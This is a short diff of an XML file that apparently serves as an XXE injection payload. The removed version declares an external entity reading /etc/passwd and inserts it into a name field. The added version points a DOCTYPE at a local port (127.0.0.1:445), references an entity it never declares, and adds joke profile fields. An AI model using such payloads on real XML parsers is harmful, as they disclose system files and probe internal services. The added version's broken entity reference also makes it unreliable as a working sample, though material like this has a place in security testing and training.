@@ -1,7 +1,10 @@
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE dtd SYSTEM “https://127.0.0.1:445”>
 <table_data>
      <table_row>
-          <name>&xxe;</name>
-          <nickname>mypass</nickname>
+          <name>&dtd;</name>
+          <nickname>mypasstron</nickname>
+          <age>18</age>
+          <level>Colonel rank 18</level>
+          <rank>Silver Elite Master</rank>
      </table_row>
 </table_data>
